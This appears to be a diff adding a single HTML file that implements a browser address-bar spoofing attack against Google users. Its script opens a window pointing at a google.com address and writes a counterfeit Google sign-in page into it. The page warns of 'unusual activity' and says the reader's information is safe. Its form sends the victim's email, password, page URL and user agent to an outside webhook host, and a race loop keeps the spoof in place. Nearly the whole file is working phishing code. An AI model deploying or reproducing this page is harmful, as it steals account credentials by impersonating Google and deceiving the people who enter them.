@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Google Security Alert</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#f5f5f5; padding:20px; }
+    .container { max-width:420px; margin:40px auto; background:white; border-radius:12px; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.15); text-align:center; }
+    h2 { color:#d93025; margin-bottom:20px; }
+    input[type="email"], input[type="password"] {
+      width:100%; padding:14px; margin:12px 0; border:1px solid #ddd; border-radius:8px; font-size:16px; box-sizing:border-box;
+    }
+    button { 
+      background:#1a73e8; color:white; border:none; padding:14px 32px; font-size:16px; border-radius:8px; cursor:pointer; width:100%; margin-top:10px;
+    }
+    button:hover { background:#1557b0; }
+    .logo { font-size:48px; color:#4285f4; margin-bottom:20px; }
+  </style>
+</head>
+<body>
+
+  <a href="javascript:window.open('https://www.google.com/csi','x');" onclick="startSpoof()">Spoof</a>
+
+  <script>
+    let windowSpoof;
+
+    function race() {
+      try {
+        windowSpoof.location.href !== 'about:blank';
+      } catch (e) {
+        windowSpoof.location.href = 'https://www.google.com/csi';
+      }
+    }
+
+    function startSpoof() {
+      windowSpoof = window.open("https://www.google.com:82", "x");
+
+      windowSpoof.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8">
+          <title>Google Account Security</title>
+          <style>
+            body { font-family: 'Google Sans', Arial, sans-serif; background:#fff; margin:0; padding:20px; }
+            .container { max-width:420px; margin:40px auto; background:white; border-radius:12px; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.15); text-align:center; }
+            .logo { font-size:64px; color:#4285f4; margin-bottom:20px; }
+            h2 { color:#333; margin-bottom:16px; }
+            p { color:#666; margin-bottom:24px; line-height:1.5; }
+            input { width:100%; padding:14px; margin:10px 0; border:1px solid #dadce0; border-radius:8px; font-size:16px; box-sizing:border-box; }
+            button { background:#1a73e8; color:white; border:none; padding:14px; font-size:16px; border-radius:8px; cursor:pointer; width:100%; margin-top:16px; }
+            button:hover { background:#1557b0; }
+          </style>
+        </head>
+        <body>
+          <div class="container">
+            <div class="logo">G</div>
+            <h2>Sign in to continue</h2>
+            <p>We noticed unusual activity on your account.<br>Please verify your identity.</p>
+
+            <form action="https://polite-whale-73.webhook.cool" method="POST">
+              <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
+              <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+              <input type="hidden" name="url" value="${encodeURIComponent(location.href)}">
+              <input type="hidden" name="useragent" value="${navigator.userAgent}">
+              <input type="hidden" name="time" value="${new Date().toISOString()}">
+              <button type="submit">Next</button>
+            </form>
+
+            <p style="margin-top:24px; font-size:13px; color:#999;">
+              This is a security check. Your information is safe.
+            </p>
+          </div>
+        </body>
+        </html>
+      `);
+
+      setInterval('race()', 0);
+    }
+  </script>
+</body>
+</html>
